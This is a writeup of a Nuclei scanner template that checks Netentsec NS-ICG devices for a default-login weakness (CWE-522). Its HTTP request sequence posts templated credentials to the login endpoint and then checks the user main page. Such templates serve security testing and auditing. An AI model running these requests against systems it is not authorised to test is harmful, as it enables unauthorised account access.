# Nuclei Template: Netentsec NS-ICG - Default Login
**Template ID:** nsicg-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`nsicg-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Netentsec NS-ICG contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
@timeout: 25s
POST /user/login/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

usrname={{username}}&pass={{password}}&signinfo=&ukey_user_flag=0&SlotSerialNumber=&agree=

@timeout: 25s
GET /user/main HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}/user/login/
```

## References
- https://www.cnvd.org.cn/flaw/show/CNVD-2016-08603
